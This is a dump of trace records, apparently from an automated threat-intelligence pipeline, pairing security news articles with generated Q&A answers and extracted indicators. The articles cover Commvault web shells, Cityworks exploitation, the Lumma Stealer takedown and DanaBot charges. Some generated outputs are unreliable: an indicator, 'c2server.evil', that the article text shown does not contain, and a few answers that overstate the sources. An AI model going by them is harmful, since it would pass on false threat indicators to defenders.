(CVE-2025-3928), an unspecified flaw in the Commvault Web Server that enables a remote, authenticated attacker to create and execute web shells.\n\n\"Based on industry experts, this threat actor uses sophisticated techniques to try to gain access to customer M365 environments,\" Commvault said in an announcement. \"This threat actor may have accessed a subset of app credentials that certain Commvault customers use to authenticate their M365 environments.\"\n\nCommvault said it has taken several remedial actions, including rotating app credentials for M365, but emphasized that there has been no unauthorized access to customer backup data.\n\nTo mitigate such threats, CISA is recommending that users and administrators follow the below guidelines -\n\n- Monitor Entra audit logs for unauthorized modifications or additions of credentials to service principals initiated by Commvault applications/service principals\n- Review Microsoft logs (Entra audit, Entra sign-in, unified audit logs) and conduct internal threat hunting\n- For single tenant apps, implement a conditional access policy that limits authentication of an application service principal to an approved IP address that is listed within Commvault's allowlisted range of IP addresses\n- Review the list of Application Registrations and Service Principals in Entra with administrative consent for higher privileges than the business need\n- Restrict access to Commvault management interfaces to trusted networks and administrative systems\n- Detect and block path-traversal attempts and suspicious file uploads by deploying a Web Application Firewall and removing external access to Commvault applications\n\nCISA, which added CVE-2025-3928 to its Known Exploited Vulnerabilities Catalog in late April 2025, said it's continuing to investigate the malicious activity in collaboration with partner organizations.\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.catonetworks.com/blog/cato-ctrl-suspected-russian-threat-actors/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/chinese-hackers-exploit-trimble.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware used includes a Rust-based loader (TetraLoader), Cobalt Strike, VShell (a Go-based remote access tool), and various web shells such as AntSword, chinatso/Chopper, and Behinder.", "question": "What kind of malware is it?"}, {"answer": "It involves a remote-code-execution vulnerability (CVE-2025-0944) exploit, allowing attackers to deliver malware such as Cobalt Strike and VShell, and deploy web shells to maintain long-term access to infected systems.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is staged in directories where web shells have been deployed for easy exfiltration, but the specific destination of the forwarded information is not mentioned.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations are enterprise networks of local governing bodies in the United States. No specific banks, wallets, or regions are mentioned.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/chinese-hackers-exploit-trimble.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "apt", "malicious", "botnet", "dropper", "backdoor"], "article_textual_content": "# Chinese Hackers Exploit Trimble Cityworks Flaw to Infiltrate U.S. Government Networks\n\nA Chinese-speaking threat actor tracked as UAT-6382 has been linked to the exploitation of a now-patched remote-code-execution vulnerability in Trimble Cityworks to deliver Cobalt Strike and VShell.\n\n\"UAT-6382 successfully exploited CVE-2025-0944, conducted reconnaissance, and rapidly deployed a variety of web shells and custom-made malware to maintain long-term access,\" Cisco Talos researchers Asheer Malhotra and Brandon White said in an analysis published today. \"Upon gaining access, UAT-6382 expressed a clear interest in pivoting to systems related to utility management.\"\n\nThe network security company said it observed the attacks targeting enterprise networks of local governing bodies in the United States starting January 2025.\n\nCVE-2025-0944 (CVSS score: 8.6) refers to the deserialization of untrusted data vulnerability affecting the GIS-centric asset management software that could enable remote code execution. The vulnerability, since patched, was added to the Known Exploited Vulnerabilities (KEV) catalog by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) in February 2025.\n\nAccording to indicators of compromise (IoCs) released by Trimble, the vulnerability has been exploited to deliver a Rust-based loader that launches Cobalt Strike and a Go-based remote access tool named VShell in an attempt to maintain long-term access to infected systems.\n\nCisco Talos, which is tracking the Rust-based loader as TetraLoader, said it's built using MaLoader, a publicly available malware-building framework written in Simplified Chinese that first appeared on GitHub in December 2024.\n\nSuccessful exploitation of the vulnerable Cityworks application results in the threat actors conducting preliminary reconnaissance to identify and fingerprint the server, and then dropping web shells like AntSword, chinatso/Chopper, and Behinder that are widely put to use by Chinese hacking groups.\n\n\"UAT-6382 enumerated multiple directories on servers of interest to identify files of interest to them and then staged them in directories where they had deployed web shells for easy exfiltration,\" the researchers said. \"UAT-6382 downloaded and deployed multiple backdoors on compromised systems via PowerShell.\"\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityaffairs.com/178176/cyber-crime/law-enforcement-dismantled-the-infrastructure-behind-lumma-stealer-maas.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Lumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data.", "question": "What kind of malware is it?"}, {"answer": "Lumma Stealer involves phishing, malvertising, and malicious downloads to infiltrate systems.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, Lumma Stealer is designed to steal sensitive data like passwords, credit card info, and crypto wallet keys, and it targets browsers to do so.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, Lumma Stealer is designed to steal sensitive data, including credit card information and other financial data, in addition to passwords, crypto wallet keys, and other sensitive information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, Lumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data, including crypto wallet keys.", "question": "Is it related to wallet stealer?"}, {"answer": "Lumma Stealer is designed to steal sensitive data like passwords, credit card information, and crypto wallet keys.", "question": "What kind of information the malware steals?"}, {"answer": "Lumma Stealer forwards the stolen information to its command-and-control (C2) infrastructure, which includes hardcoded tier 1 servers, and fallback C2s via Telegram and Steam, all hidden behind Cloudflare.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://securityaffairs.com/178176/cyber-crime/law-enforcement-dismantled-the-infrastructure-behind-lumma-stealer-maas.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://t.co/securityaffairs"}], "keywords_found": ["analysis", "sinkhole", "threat", "fraud", "intelligence", "wallet", "apt", "phishing", "cybercrime", "malicious", "passwords", "cryptocurrency", "bank", "browser"], "article_textual_content": "# Law enforcement dismantled the infrastructure behind Lumma Stealer MaaS\n\n## Microsoft found 394,000 Windows systems talking to Lumma stealer controllers, a victim pool that included global manufacturers.\n\nA US court order, with Europol and Japan’s JC3 dismantled the Lumma Stealer malware operation, seizing 2,300 domains used for command-and-control and blocking dark web markets offering the infostealer.\n\nA US court order, with Europol and Japan’s JC3, dismantled Lumma Stealer’s infrastructure, seizing domains and control panels. Microsoft’s Digital Crimes Unit sinkholed over 1,300 domains to reroute victims to safe servers for analysis and cleanup.\n\n“The Justice Department announced today the unsealing of two warrants authorizing the seizure of five internet domains used by malicious cyber actors to operate the LummaC2 information-stealing malware service.” reads the press release published by DoJ.\n\nLumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data like passwords, credit card info, and crypto wallet keys. It infiltrates systems via phishing, malvertising, and malicious downloads. It can also deploy additional malware and evade detection.\n\nThe malware had infected over 394,000 Windows systems, including those of global manufacturers.\n\nMicrosoft observed Lumma Stealer’s rapid growth and sophistication as a MaaS used by financially motivated threat actors. Distributed via phishing, malvertising, and abuse of trusted platforms, Lumma targets browsers, wallets, and apps. Lumma’s flexibility and resilience highlight the evolving cybercrime landscape and the need for layered, collaborative defense efforts.\n\nMicrosoft tracks the developer of Lumma Stealer and its C2 infrastructure as threat actor Storm-2477. Ransomware groups like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 have used Lumma in their campaigns.\n\nLumma Stealer uses a layered C2 infrastructure with hardcoded tier 1 servers and fallback C2s via Telegram and Steam, all hidden behind Cloudflare. Telegram is prioritized, and Steam is used if others fail. Affiliates can pay for personal C2s. All communication is encrypted via HTTPS.\n\n“Different types of obfuscation are applied to each set of C2 servers. For example, the hardcoded list of C2s, and including the Telegram fallback C2 URL are protected with ChaCha20 crypto, while the Steam profile fallback C2 URL is encrypted using custom stack-based crypto algorithm that can change on each version of Lumma malware.” states Microsoft. “We have identified up to six versions of Lumma Stealer, and while each of these versions focuses on improving techniques to evade antivirus detections, there are also several changes in the C2 communication protocol and formats such as the C2 domains, URI path, POST data, and others. The core Lumma malware stores the build date as part of the embedded configuration to keep track of improvements, but in our investigation, we tracked major changes using the labels “version 1” through “version 6”.”\n\nThe FBI and US CISA also released a joint advisory that includes tactics, techniques, and procedures (TTPs) associated with Lumma Stealer along with indicators of compromise (IOCs).\n\n“Malware like LummaC2 is deployed to steal sensitive information such as user login credentials from millions of victims in order to facilitate a host of crimes, including fraudulent bank transfers and cryptocurrency theft,” said Matthew R. Galeotti, head of the Justice Department’s Criminal Division. “Today’s announcement demonstrates that the Justice Department is resolved to use court-ordered disruptions like this one to protect the public from the theft of their personal information and their assets. The Department is also committed to working with and appreciates the efforts of the private sector to safeguard the public from cybercrime.”\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, malware)\n\n#### you might also like\n\n##### U.S. CISA adds a Samsung MagicINFO 9 Server flaw to its Known Exploited Vulnerabilities catalog\n\n##### New Signal update stops Windows from capturing user chats\n\n#### leave a comment\n\n#### newsletter\n\n###### Subscribe to my email list and stay\n up-to-date!\n\n#### recent articles\n\n###### U.S. CISA adds a Samsung MagicINFO 9 Server flaw to its Known Exploited Vulnerabilities catalog\n\nHacking / May 22, 2025\n\n###### New Signal update stops Windows from capturing user chats\n\nDigital ID / May 22, 2025\n\n###### Law enforcement dismantled the infrastructure behind Lumma Stealer MaaS\n\nCyber Crime / May 22, 2025\n\n###### Russia-linked APT28 targets western logistics entities and technology firms\n\nAPT / May 22, 2025\n\n###### A cyberattack was responsible for the week-long outage affecting Cellcom wireless network\n\nSecurity / May 21, 2025\n\nTo contact me write an email to:\n\n\n                            Pierluigi Paganini : \n\n[email protected]\n\n#### QUICK LINKS\n\n- Home\n- Cyber Crime\n- Cyber warfare\n- APT\n- Data Breach\n- Deep Web\n- Digital ID\n- Hacking\n- Hacktivism\n- Intelligence\n- Internet of Things\n- Laws and regulations\n- Malware\n- Mobile\n- Reports\n- Security\n- Social Networks\n- Terrorism\n- ICS-SCADA\n- POLICIES\n- Contact me\n\nCopyright@securityaffairs 2024\n\nWe use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit \"Cookie Settings\" to provide a controlled consent.\n\n#### Privacy Overview\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/fbi-and-europol-disrupt-lumma-stealer.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://blogs.microsoft.com/on-the-issues/2025/05/21/microsoft-leads-global-action-against-favored-cybercrime-tool/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://blogs.microsoft.com/on-the-issues/2025/05/21/microsoft-leads-global-action-against-favored-cybercrime-tool/", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://krebsonsecurity.com/2025/05/oops-danabot-malware-devs-infected-their-own-pcs/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "DanaBot is a malware-as-a-service platform that specializes in credential theft and banking fraud, and a newer version was also used for espionage.", "question": "What kind of malware is it?"}, {"answer": "It involves a malware-as-a-service platform that specializes in credential theft and banking fraud, with a newer version used for espionage.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "DanaBot is a malware-as-a-service platform that specializes in credential theft and banking fraud, indicating it steals bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "DanaBot is a malware-as-a-service platform that specializes in credential theft and banking fraud, which can be related to wallet stealing.", "question": "Is it related to wallet stealer?"}, {"answer": "The DanaBot malware steals credentials, financial transactions, and sensitive diplomatic communications, including correspondence and summaries of a country's interactions with the United States.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen data is uploaded to stolen data repositories, which were seized by the FBI.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include the United States, Belarus, the United Kingdom, Germany, and Russia, with targets such as military, diplomatic, and non-governmental organization computers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://krebsonsecurity.com/2025/05/oops-danabot-malware-devs-infected-their-own-pcs/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "c2server.evil"}], "keywords_found": ["fraud", "cybercrime", "malicious", "bank", "zeus", "transaction"], "article_textual_content": "# Oops: DanaBot Malware Devs Infected Their Own PCs\n\nThe U.S. government today unsealed criminal charges against 16 individuals accused of operating and selling DanaBot, a prolific strain of information-stealing malware that has been sold on Russian cybercrime forums since 2018. The FBI says a newer version of DanaBot was used for espionage, and that many of the defendants exposed their real-life identities after accidentally infecting their own systems with the malware.\n\nInitially spotted in May 2018 by researchers at the email security firm Proofpoint, DanaBot is a malware-as-a-service platform that specializes in credential theft and banking fraud.\n\nToday, the U.S. Department of Justice unsealed a criminal complaint and indictment from 2022, which said the FBI identified at least 40 affiliates who were paying between $3,000 and $4,000 a month for access to the information stealer platform.\n\nThe government says the malware infected more than 300,000 systems globally, causing estimated losses of more than $50 million. The ringleaders of the DanaBot conspiracy are named as Aleksandr Stepanov, 39, a.k.a. “JimmBee,” and Artem Aleksandrovich Kalinkin, 34, a.k.a. “Onix”, both of Novosibirsk, Russia. Kalinkin is an IT engineer for the Russian state-owned energy giant Gazprom. His Facebook profile name is “Maffiozi.”\n\nAccording to the FBI, there were at least two major versions of DanaBot; the first was sold between 2018 and June 2020, when the malware stopped being offered on Russian cybercrime forums. The government alleges that the second version of DanaBot — emerging in January 2021 — was provided to co-conspirators for use in targeting military, diplomatic and non-governmental organization computers in several countries, including the United States, Belarus, the United Kingdom, Germany, and Russia.\n\n“Unindicted co-conspirators would use the Espionage Variant to compromise computers around the world and steal sensitive diplomatic communications, credentials, and other data from these targeted victims,” reads a grand jury indictment dated Sept. 20, 2022. “This stolen data included financial transactions by diplomatic staff, correspondence concerning day-to-day diplomatic activity, as well as summaries of a particular country’s interactions with the United States.”\n\nThe indictment says the FBI in 2022 seized servers used by the DanaBot authors to control their malware, as well as the servers that stored stolen victim data. The government said the server data also show numerous instances in which the DanaBot defendants infected their own PCs, resulting in their credential data being uploaded to stolen data repositories that were seized by the feds.\n\n“In some cases, such self-infections appeared to be deliberately done in order to test, analyze, or improve the malware,” the criminal complaint reads. “In other cases, the infections seemed to be inadvertent – one of the hazards of committing cybercrime is that criminals will sometimes infect themselves with their own malware by mistake.”\n\nA statement from the DOJ says that as part of today’s operation, agents with the Defense Criminal Investigative Service (DCIS) seized the DanaBot control servers, including dozens of virtual servers hosted in the United States. The government says it is now working with industry partners to notify DanaBot victims and help remediate infections. The statement credits a number of security firms with providing assistance to the government, including ESET, Flashpoint, Google, Intel 471, Lumen, PayPal, Proofpoint, Team CYRMU, and ZScaler.\n\nIt’s not unheard of for financially-oriented malicious software to be repurposed for espionage. A variant of the ZeuS Trojan, which was used in countless online banking attacks against companies in the United States and Europe between 2007 and at least 2015, was for a time diverted to espionage tasks by its author.\n\nAs detailed in this 2015 story, the author of the ZeuS trojan created a custom version of the malware to serve purely as a spying machine, which scoured infected systems in Ukraine for specific keywords in emails and documents that would likely only be found in classified documents.\n\nThe public charging of the 16 DanaBot defendants comes a day after Microsoft joined a slew of tech companies in disrupting the IT infrastructure for another malware-as-a-service offering — Lumma Stealer, which is likewise offered to affiliates under tiered subscription prices ranging from $250 to $1,000 per month. Separately, Microsoft filed a civil lawsuit to seize control over 2,300 domain names used by Lumma Stealer and its affiliates.\n\nFurther reading:\n\nDanabot: Analyzing a Fallen Empire\n\nZScaler blog: DanaBot Launches DDoS Attack Against the Ukrainian Ministry of Defense\n\nFlashpoint: Operation Endgame DanaBot Malware\n\nTeam CYRMU: Inside DanaBot’s Infrastructure: In Support of Operation Endgame II\n\nMarch 2022 criminal complaint v. Artem Aleksandrovich Kalinkin\n\nSeptember 2022 grand jury indictment naming the 16 defendants\n\nThis entry was posted on Thursday 22nd of May 2025 05:53 PM\n\nPost navigation\n\n## One thought on “Oops: DanaBot Malware Devs Infected Their Own PCs”\n\n1. Brian May 23, 2025 \n\nI hope you come out of your downward spiral Krebs. We are all pulling for you.\n\n\nReply →\n\n### Leave a Reply Cancel reply\n\nYour email address will not be published. Required fields are marked *\n\nComment *\n\nName *\n\nEmail *\n\nWebsite\n\nΔ\n\nAdvertisement\n\nAdvertisement\n\nMailing List\n\nSearch KrebsOnSecurity\n\nRecent Posts\n\n- Oops: DanaBot Malware Devs Infected Their Own PCs\n- KrebsOnSecurity Hit With Near-Record 6.3 Tbps DDoS\n- Breachforums Boss to Pay $700k in Healthcare Breach\n- Patch Tuesday, May 2025 Edition\n- Pakistani Firm Shipped Fentanyl Analogs, Scams to US\n\nStory Categories\n\n- A Little Sunshine\n- All About Skimmers\n- Ashley Madison breach\n- Breadcrumbs\n- Data Breaches\n- DDoS-for-Hire\n- DOGE\n- Employment Fraud\n- How to Break Into Security\n- Internet of Things (IoT)\n- Latest Warnings\n- Ne'er-Do-Well News\n- Other\n- Pharma Wars\n- Ransomware\n- Russia's War on Ukraine\n- Security Tools\n- SIM Swapping\n- Spam Nation\n- Target: Small Businesses\n- Tax Refund Fraud\n- The Coming Storm\n- Time to Patch\n- Web Fraud 2.0\n\nWhy So Many Top Hackers Hail from Russia\n\n© Krebs on Security -"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.welivesecurity.com/en/eset-research/eset-takes-part-global-operation-disrupt-lumma-stealer/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.securitymagazine.com/articles/101638-deepfake-scam-or-inside-job-rethinking-the-bec-threat", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Lumma Stealer is an infostealer malware, specifically a malware as a service (MaaS) offering, capable of stealing data from various browsers and applications.", "question": "What kind of malware is it?"}, {"answer": "Lumma Stealer involves various types of attacks, including phishing, malvertising, drive-by downloads, and abuse of legitimate services, to steal sensitive information such as browser credentials, cryptocurrency wallets, and other user data.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, Lumma Stealer extracts saved passwords, session cookies, and autofill data from browsers, including Chromium, Mozilla, and Gecko-based browsers.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, Lumma Stealer is capable of installing other malware or plugins, including coin miners, and it targets data from various browser extensions.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, Lumma Stealer is capable of stealing various types of data, including browser credentials and cookies, cryptocurrency wallets, and other sensitive information, but it does not specifically target credit cards or bank information. However, it can steal data from various applications, including VPNs, email clients, and FTP clients.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, Lumma Stealer is related to wallet stealer, as it targets and steals data from cryptocurrency wallets and browser extensions associated with 